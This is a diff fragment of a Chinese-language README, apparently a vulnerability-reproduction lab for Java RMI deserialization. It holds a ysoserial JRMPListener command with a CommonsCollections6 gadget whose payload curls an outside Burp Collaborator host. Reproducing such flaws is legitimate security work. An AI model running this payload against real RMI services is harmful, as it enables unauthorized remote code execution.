@@ -39,6 +39,7 @@ docker-compose run -e RMIIP=your-ip -p 1099:1099 rmi
 ## 漏洞复现
 
 通过[ysoserial](https://github.com/wh1t3p1g/ysoserial)的exploit包中的RMIRegistryExploit2或者3进行攻击
+
 ```bash
 // 开启JRMPListener
 java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "curl http://xxxxx.burpcollaborator.net"
